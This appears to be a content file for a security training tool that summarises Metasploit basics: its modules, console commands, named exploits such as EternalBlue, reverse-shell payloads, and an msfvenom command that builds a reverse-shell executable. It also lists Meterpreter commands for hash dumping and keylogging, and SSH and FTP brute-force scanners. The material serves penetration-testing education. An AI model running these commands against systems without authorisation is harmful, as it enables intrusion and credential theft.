metasploit_basics.title: Metasploit Framework Basics
metasploit_basics.description: Core concepts and commands for the Metasploit Framework, the most widely used penetration testing toolkit.

topics.Architecture: Metasploit has a modular architecture: Exploits (code that triggers a vulnerability), Payloads (code that runs after successful exploitation — singles, stagers, stages), Encoders (obfuscate payloads), Nops (NOP sled generators), Auxiliary (scanners, fuzzers, DoS), Post (post-exploitation modules). Data is stored in PostgreSQL.
topics.Basic Commands: msfconsole — start the framework. db_status — check database connection. workspace — manage workspaces. search <term> — find modules. use <module> — select a module. info — module details. show options — required options. set RHOSTS <target> — set target. set PAYLOAD <payload> — select payload. exploit / run — launch. sessions -l — list sessions. sessions -i <id> — interact with session.
topics.Common Exploits: exploit/multi/handler — catch reverse shells. exploit/windows/smb/ms17_010_eternalblue — EternalBlue. exploit/windows/smb/psexec — authenticated code exec. exploit/unix/ftp/vsftpd_234_backdoor — vsftpd backdoor. exploit/multi/http/apache_mod_cgi_bash_env_exec — Shellshock.
topics.Payloads: windows/meterpreter/reverse_tcp — Windows Meterpreter reverse shell. linux/x86/meterpreter/reverse_tcp — Linux Meterpreter. windows/shell_reverse_tcp — simple Windows reverse shell. cmd/unix/reverse_bash — Bash reverse shell. msfvenom — standalone payload generator: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
topics.Meterpreter Commands: sysinfo — system info. getuid — current user. getsystem — attempt privilege escalation. hashdump — dump password hashes. ps — process list. migrate <PID> — migrate to process. upload/download — file transfer. shell — drop to OS shell. portfwd — port forwarding. keyscan_start/keyscan_dump — keylogging. screenshot — take screenshot. run post/multi/recon/local_exploit_suggester — find local privilege escalation vectors.
topics.Auxiliary Modules: auxiliary/scanner/portscan/tcp — TCP port scan. auxiliary/scanner/smb/smb_version — SMB version detection. auxiliary/scanner/http/http_version — web server info. auxiliary/scanner/ssh/ssh_login — SSH brute force. auxiliary/scanner/ftp/ftp_login — FTP brute force. auxiliary/scanner/discovery/udp_sweep — UDP service discovery.
topics.Database & Reporting: db_nmap — run nmap and import results. hosts — list discovered hosts. services — list discovered services. vulns — list discovered vulns. creds — stored credentials. loot — collected loot files. db_export — export data. Example workflow: workspace -a pentest1 → db_nmap -sV target → hosts → services → vulns → search relevant exploit → use → exploit.
